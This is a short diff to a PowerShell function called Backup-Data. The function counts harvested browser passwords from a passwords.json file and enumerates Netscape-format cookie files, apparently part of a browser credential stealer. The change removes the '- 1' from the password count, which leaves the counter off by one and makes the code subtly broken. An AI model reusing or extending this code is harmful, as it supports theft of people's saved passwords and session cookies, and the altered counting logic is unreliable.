@@ -1313,7 +1313,7 @@ function Backup-Data {
 	#Count Passwords
 	$jsonFilePath = "$browser_data\passwords.json"
 	$jsonContent = Get-Content -Path $jsonFilePath -Raw
-	$passwordCounter = ($jsonContent -split '"password":').Length - 1
+	$passwordCounter = ($jsonContent -split '"password":').Length
 	#Count Coockies
 	$cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
 	foreach ($file in $cookieFiles) {
